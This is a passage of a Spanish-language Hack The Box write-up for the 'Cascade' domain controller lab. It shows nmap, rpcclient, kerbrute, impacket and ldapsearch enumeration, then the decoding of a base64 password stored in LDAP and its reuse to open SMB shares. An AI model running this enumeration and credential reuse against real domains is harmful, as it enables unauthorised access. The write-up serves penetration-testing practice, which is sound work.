@@ -1,0 +1,1188 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Cascade (medium) · MiguelRega7</title>
+<meta name="description" content="- Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user r.thompson , whic"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Cascade (medium)</h1><div class="meta"><span>◷</span><time>2024-06-01</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user r.thompson , whic.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#shell-as-s-smith">Shell as s.smith</a><a href="#user-txt">User txt</a><a href="#arksvc">arksvc</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#root-txt">root.txt</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/64fef851357b8de1c4834093bf3426f2.png">
+</p>
+
+<ul>
+<li>Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user <code>r.thompson</code>, which gives access to a <code>TightVNC</code> registry backup. The backup is decrypted to gain the password for <code>s.smith</code>. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the <code>ArkSvc</code> account. This account belongs to the <code>AD Recycle Bin</code> group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Comenzamos enumerando los puertos y servicios abiertos por el protocoló <strong>TCP</strong> de la máquina victima.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sCV -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 10.10.10.182 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 10:48 CST
+Nmap scan report for 10.10.10.182
+Host is up (0.091s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-30 16:48:29Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2024-05-30T16:49:21
+|_  start_date: 2024-05-30T16:45:09
+|_clock-skew: -4s
+| smb2-security-mode:
+|   2:1:0:
+|_    Message signing enabled and required
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li>Vamos agregar el nombre del dominio al <code>/etc/hosts</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap cme ldap 10.10.10.182
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap echo &quot;10.10.10.182 cascade.local dc.cascade.local&quot; | sudo tee -a /etc/hosts
+10.10.10.182 cascade.local dc.cascade.local
+</code></pre></div></div>
+<ul>
+<li>No podemos enumerar por el protocolo <code>smb</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap cme smb 10.10.10.182 --shares
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
+➜  nmap cme smb 10.10.10.182 -u &quot;miguelito&quot; -p &quot;&quot; --shares
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\miguelito: STATUS_LOGON_FAILURE
+➜  nmap smbclient -N -L //10.10.10.182
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre></div></div>
+<ul>
+<li>Podemos enumerar usuarios con la herramienta <code>rpcclient</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap rpcclient -N -U &quot;&quot; 10.10.10.182
+rpcclient $&gt; enumdomusers
+user:[CascGuest] rid:[0x1f5]
+user:[arksvc] rid:[0x452]
+user:[s.smith] rid:[0x453]
+user:[r.thompson] rid:[0x455]
+user:[util] rid:[0x457]
+user:[j.wakefield] rid:[0x45c]
+user:[s.hickson] rid:[0x461]
+user:[j.goodhand] rid:[0x462]
+user:[a.turnbull] rid:[0x464]
+user:[e.crowe] rid:[0x467]
+user:[b.hanson] rid:[0x468]
+user:[d.burman] rid:[0x469]
+user:[BackupSvc] rid:[0x46a]
+user:[j.allen] rid:[0x46e]
+user:[i.croft] rid:[0x46f]
+rpcclient $&gt;
+</code></pre></div></div>
+<ul>
+<li>Vamos agregar a los usuarios una lista.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap rpcclient -N -U &quot;&quot; 10.10.10.182 -c enumdomusers | grep -oP &quot;\[.*?\]&quot; | grep -v &quot;0x&quot; | tr -d '[]' &gt; users.txt
+➜  nmap cat users.txt
+CascGuest
+arksvc
+s.smith
+r.thompson
+util
+j.wakefield
+s.hickson
+j.goodhand
+a.turnbull
+e.crowe
+b.hanson
+d.burman
+BackupSvc
+j.allen
+i.croft
+</code></pre></div></div>
+<ul>
+<li>Vamos a verificar que los usuarios sean correctos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap /opt/kerbrute_linux_amd64 userenum -d cascade.local --dc cascade.local users.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 05/30/24 - Ronnie Flathers @ropnop
+
+2024/05/30 10:58:12 &gt;  Using KDC(s):
+2024/05/30 10:58:12 &gt;  	cascade.local:88
+
+2024/05/30 10:58:17 &gt;  [+] VALID USERNAME:	 s.hickson@cascade.local
+2024/05/30 10:58:17 &gt;  [+] VALID USERNAME:	 j.goodhand@cascade.local
+2024/05/30 10:58:17 &gt;  [+] VALID USERNAME:	 j.wakefield@cascade.local
+2024/05/30 10:58:17 &gt;  [+] VALID USERNAME:	 s.smith@cascade.local
+2024/05/30 10:58:17 &gt;  [+] VALID USERNAME:	 a.turnbull@cascade.local
+2024/05/30 10:58:17 &gt;  [+] VALID USERNAME:	 r.thompson@cascade.local
+2024/05/30 10:58:20 &gt;  [+] VALID USERNAME:	 util@cascade.local
+2024/05/30 10:58:20 &gt;  [+] VALID USERNAME:	 arksvc@cascade.local
+2024/05/30 10:58:22 &gt;  [+] VALID USERNAME:	 d.burman@cascade.local
+2024/05/30 10:58:22 &gt;  [+] VALID USERNAME:	 j.allen@cascade.local
+2024/05/30 10:58:22 &gt;  [+] VALID USERNAME:	 BackupSvc@cascade.local
+2024/05/30 10:58:22 &gt;  Done! Tested 15 usernames (11 valid) in 10.383 seconds
+</code></pre></div></div>
+<ul>
+<li>Vamos a tratar de obtener un <code>TGT</code> sin uso de una contraseña por que no disponemos de ninguna pero si probamos con este ataque no tenemos suerte.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap impacket-GetNPUsers -no-pass -usersfile users.txt cascade.local/
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</code></pre></div></div>
+<ul>
+<li><p>Tenemos el puerto <code>ldap</code> abierto así que también podemos enumerar por ese protocolo <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a>.</p>
+</li>
+<li><p>Vamos a usar <code>ldapsearch</code> para enumerar este servicio algo que podemos hacer es ver los usuarios si es que no nos pide credenciales.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap ldapsearch -x -H ldap://10.10.10.182 -b &quot;dc=cascade,dc=local&quot; | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}'
+CascGuest
+arksvc
+s.smith
+r.thompson
+util
+j.wakefield
+s.hickson
+j.goodhand
+a.turnbull
+e.crowe
+b.hanson
+d.burman
+BackupSvc
+j.allen
+i.croft
+</code></pre></div></div>
+<ul>
+<li>Pero bueno como ya hicimos pruebas con los usuarios de solicitar un <code>TGT</code> vamos mejor seguir enumerando filtrando por el <code>Distinguished Name</code> y aquellas líneas que contienen la palabra <code>users</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap ldapsearch -x -H ldap://10.10.10.182 -b &quot;dc=cascade,dc=local&quot; | grep 'dn' | grep -i 'users'
+dn: CN=Users,DC=cascade,DC=local
+dn: CN=Administrator,CN=Users,DC=cascade,DC=local
+dn: CN=CascGuest,CN=Users,DC=cascade,DC=local
+dn: CN=Users,CN=Builtin,DC=cascade,DC=local
+dn: CN=Remote Desktop Users,CN=Builtin,DC=cascade,DC=local
+dn: CN=Performance Monitor Users,CN=Builtin,DC=cascade,DC=local
+dn: CN=Performance Log Users,CN=Builtin,DC=cascade,DC=local
+dn: CN=Distributed COM Users,CN=Builtin,DC=cascade,DC=local
+dn: CN=krbtgt,CN=Users,DC=cascade,DC=local
+dn: CN=Domain Computers,CN=Users,DC=cascade,DC=local
+dn: CN=Domain Controllers,CN=Users,DC=cascade,DC=local
+dn: CN=Schema Admins,CN=Users,DC=cascade,DC=local
+dn: CN=Enterprise Admins,CN=Users,DC=cascade,DC=local
+dn: CN=Cert Publishers,CN=Users,DC=cascade,DC=local
+dn: CN=Domain Admins,CN=Users,DC=cascade,DC=local
+dn: CN=Domain Users,CN=Users,DC=cascade,DC=local
+dn: CN=Domain Guests,CN=Users,DC=cascade,DC=local
+dn: CN=Group Policy Creator Owners,CN=Users,DC=cascade,DC=local
+dn: CN=RAS and IAS Servers,CN=Users,DC=cascade,DC=local
+dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=cascade,DC=local
+dn: CN=Denied RODC Password Replication Group,CN=Users,DC=cascade,DC=local
+dn: CN=Read-only Domain Controllers,CN=Users,DC=cascade,DC=local
+dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=cascade,DC=local
+dn: CN=DnsAdmins,CN=Users,DC=cascade,DC=local
+dn: CN=DnsUpdateProxy,CN=Users,DC=cascade,DC=local
+dn: OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=WinRMRemoteWMIUsers__,CN=Users,DC=cascade,DC=local
+dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
+dn: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
+dn: OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
+dn: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
+</code></pre></div></div>
+<ul>
+<li>Vemos usuarios importantes.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap ldapsearch -x -H ldap://10.10.10.182 -b &quot;ou=Users,ou=UK,dc=cascade,dc=local&quot; | grep -i '#\|memberof'
+# extended LDIF
+#
+# LDAPv3
+# base &lt;ou=Users,ou=UK,dc=cascade,dc=local&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+# Users, UK, cascade.local
+# Steve Smith, Users, UK, cascade.local
+memberOf: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
+memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+# Ryan Thompson, Users, UK, cascade.local
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+# James Wakefield, Users, UK, cascade.local
+# Stephanie Hickson, Users, UK, cascade.local
+memberOf: CN=HR,OU=Groups,OU=UK,DC=cascade,DC=local
+# John Goodhand, Users, UK, cascade.local
+# Adrian Turnbull, Users, UK, cascade.local
+# Edward Crowe, Users, UK, cascade.local
+# Ben Hanson, Users, UK, cascade.local
+# David Burman, Users, UK, cascade.local
+# Services, Users, UK, cascade.local
+# ArkSvc, Services, Users, UK, cascade.local
+memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
+memberOf: CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+# Util, Services, Users, UK, cascade.local
+# BackupSvc, Services, Users, UK, cascade.local
+# Joseph Allen, Users, UK, cascade.local
+# Ian Croft, Users, UK, cascade.local
+# search result
+# numResponses: 17
+# numEntries: 16
+</code></pre></div></div>
+<ul>
+<li>Si vemos información del usuario podemos ver información como una contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap ldapsearch -x -H ldap://10.10.10.182 -b &quot;ou=Users,ou=UK,dc=cascade,dc=local&quot; | grep -A 50 -i &quot;# Ryan Thompson&quot;
+
+# Ryan Thompson, Users, UK, cascade.local
+dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ryan Thompson
+sn: Thompson
+givenName: Ryan
+distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109193126.0Z
+whenChanged: 20200323112031.0Z
+displayName: Ryan Thompson
+uSNCreated: 24610
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+uSNChanged: 295010
+name: Ryan Thompson
+objectGUID:: LfpD6qngUkupEy9bFXBBjA==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132247339091081169
+lastLogoff: 0
+lastLogon: 132247339125713230
+pwdLastSet: 132230718862636251
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: r.thompson
+sAMAccountType: 805306368
+userPrincipalName: r.thompson@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200126183918.0Z
+dSCorePropagationData: 20200119174753.0Z
+dSCorePropagationData: 20200119174719.0Z
+dSCorePropagationData: 20200119174508.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 132294360317419816
+msDS-SupportedEncryptionTypes: 0
+cascadeLegacyPwd: clk0bjVldmE=
+
+# James Wakefield, Users, UK, cascade.local
+dn: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: James Wakefield
+</code></pre></div></div>
+<ul>
+<li>Al parecer es <code>base64</code> y podemos convertirla a texto plano.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap echo clk0bjVldmE= | base64 -d
+rY4n5eva
+</code></pre></div></div>
+<h2 id="shell-as-s-smith">Shell as s.smith</h2>
+<ul>
+<li>Verificamos que las credenciales sean correctas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cme smb 10.10.10.182 -u &quot;r.thompson&quot; -p &quot;rY4n5eva&quot;
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
+</code></pre></div></div>
+<ul>
+<li>Vamos a ver los recursos compartidos por el método <code>smb</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cme smb 10.10.10.182 -u &quot;r.thompson&quot; -p &quot;rY4n5eva&quot; --shares
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
+SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
+SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
+SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
+SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
+SMB         10.10.10.182    445    CASC-DC1         Audit$
+SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
+SMB         10.10.10.182    445    CASC-DC1         Data            READ
+SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
+SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
+SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
+SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
+</code></pre></div></div>
+<ul>
+<li>Tenemos capacidad de lectura en un recurso importante que se llama <code>Data</code> vamos a ver que es lo que hay.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content smbclient //10.10.10.182/data -U r.thompson%rY4n5eva
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sun Jan 26 21:27:34 2020
+  ..                                  D        0  Sun Jan 26 21:27:34 2020
+  Contractors                         D        0  Sun Jan 12 19:45:11 2020
+  Finance                             D        0  Sun Jan 12 19:45:06 2020
+  IT                                  D        0  Tue Jan 28 12:04:51 2020
+  Production                          D        0  Sun Jan 12 19:45:18 2020
+  Temps                               D        0  Sun Jan 12 19:45:15 2020
+
+		6553343 blocks of size 4096. 1625340 blocks available
+smb: \&gt;
+</code></pre></div></div>
+<ul>
+<li>Encontramos información interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">smb: \IT\&gt; dir
+  .                                   D        0  Tue Jan 28 12:04:51 2020
+  ..                                  D        0  Tue Jan 28 12:04:51 2020
+  Email Archives                      D        0  Tue Jan 28 12:00:30 2020
+  LogonAudit                          D        0  Tue Jan 28 12:04:40 2020
